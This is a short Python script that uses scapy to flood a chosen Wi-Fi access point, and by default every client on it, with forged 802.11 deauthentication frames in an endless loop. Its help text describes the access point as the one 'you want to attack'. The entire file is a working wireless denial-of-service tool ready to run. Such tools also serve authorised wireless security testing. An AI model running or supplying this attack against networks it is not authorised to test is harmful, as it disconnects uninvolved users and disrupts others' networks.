import time
import sys
import os
from scapy.all import *
from optparse import OptionParser

usage="Usage:%prog -i interface -t packet-type -a bssid -c client-MAC(optional)"
parser=OptionParser(usage)

parser.add_option('-i',dest="interface",help="network card")
parser.add_option('-t',dest="type",help="the reason for the termination code,0-9(optional)")
parser.add_option('-a',dest="bssid",help="the Access Point you want to attack")
parser.add_option('-c',dest="c_mac",help="the client's MAC address(optional)")

(options,args) = parser.parse_args()

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit(0)
elif options.interface is None or \
     options.bssid is None: 
        parser.print_help()
        sys.exit()
c_mac = options.c_mac
t_type = options.type
iface = options.interface
bssid = options.bssid

if t_type == None:
    t_type = 0
if c_mac == None:
    c_mac = "ff:ff:ff:ff:ff:ff".upper()
print c_mac


pkt = RadioTap()/\
Dot11(subtype=0x00c,addr1=c_mac,addr2=bssid,addr3=bssid)/\
Dot11Deauth(reason=int(t_type))

while True:
    sendp(pkt,iface=iface)
